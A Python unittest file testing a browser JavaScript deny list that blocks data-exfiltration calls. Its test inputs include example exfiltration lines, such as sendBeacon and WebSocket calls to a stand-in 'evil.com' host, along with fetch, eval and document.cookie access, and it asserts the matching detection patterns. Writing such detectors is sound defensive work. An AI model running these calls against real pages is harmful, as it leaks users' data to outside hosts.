"""S6 (bughunt): browserDenyJsPatterns must cover sendBeacon and WebSocket.

The deny list blocked fetch/XHR-style exfiltration but missed two
vectors: navigator.sendBeacon (fire-and-forget, works during unload) and
WebSocket (a persistent channel neither fetch nor XHR patterns see).
The fix adds both call shapes. A bare mention without a call (no parens)
is intentionally NOT flagged — the list matches calls, not prose.
"""
import re
import unittest

import policy


def _hits(js: str) -> bool:
    pats = [re.compile(p) for p in
            policy._DEFAULT_CONFIG["browserDenyJsPatterns"]]
    return any(p.search(js) for p in pats)


class BrowserDenyJsPatternTests(unittest.TestCase):
    def test_sendbeacon_call_is_denied(self):
        self.assertTrue(_hits("navigator.sendBeacon('https://evil.com', data)"))

    def test_websocket_construction_is_denied(self):
        self.assertTrue(_hits("let ws = new WebSocket('wss://evil.com')"))
        self.assertTrue(_hits("WebSocket('wss://x')"))

    def test_existing_vectors_still_denied(self):
        for js in ("fetch('https://x')", "XMLHttpRequest",
                   "eval('code')", "document.cookie"):
            self.assertTrue(_hits(js), f"existing pattern lost: {js!r}")

    def test_normal_js_not_flagged(self):
        for js in ("document.getElementById('ok')",
                   "console.log('done')",
                   "element.textContent = 'value'"):
            self.assertFalse(_hits(js), f"false positive: {js!r}")

    def test_bare_mention_without_call_not_flagged(self):
        # The list matches calls; prose mentioning the API name is not one.
        self.assertFalse(_hits("console.log('sendBeacon mention in string')"))

    def test_patterns_merge_into_effective_config(self):
        # _get_compiled_rules / evaluate must see the new patterns via the
        # default-merge path, not just the raw default dict.
        cfg = dict(policy._DEFAULT_CONFIG)
        cfg["browserDenyJsPatterns"] = []  # user emptied their local list
        merged = policy._DEFAULT_CONFIG["browserDenyJsPatterns"]
        self.assertIn(r"\bsendBeacon\s*\(", merged)
        self.assertIn(r"\bnew\s+WebSocket\b", merged)


if __name__ == "__main__":
    unittest.main()
